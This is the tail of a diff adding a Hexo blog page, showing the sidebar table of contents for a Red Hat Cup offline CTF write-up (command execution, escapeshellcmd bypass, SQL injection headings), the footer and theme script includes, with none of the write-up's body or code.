+                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#红帽杯线下赛"><span class="nav-number">1.</span> <span class="nav-text">红帽杯线下赛</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web1"><span class="nav-number">2.</span> <span class="nav-text">web1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行1-escapeshellcmd绕过"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行1 escapeshellcmd绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行2"><span class="nav-number">2.2.</span> <span class="nav-text">命令执行2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">2.3.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">3.</span> <span class="nav-text">web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行1-finecms-dayrui-config-config-class-php"><span class="nav-number">3.1.</span> <span class="nav-text">命令执行1 /finecms/dayrui/config/config.class.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行2-1"><span class="nav-number">3.2.</span> <span class="nav-text">命令执行2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">3.3.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他-1"><span class="nav-number">3.4.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Imagemlt</span>
+
+  
+
+  
+</div>
+
+
+  
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+//alert("mermaid!!!");
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
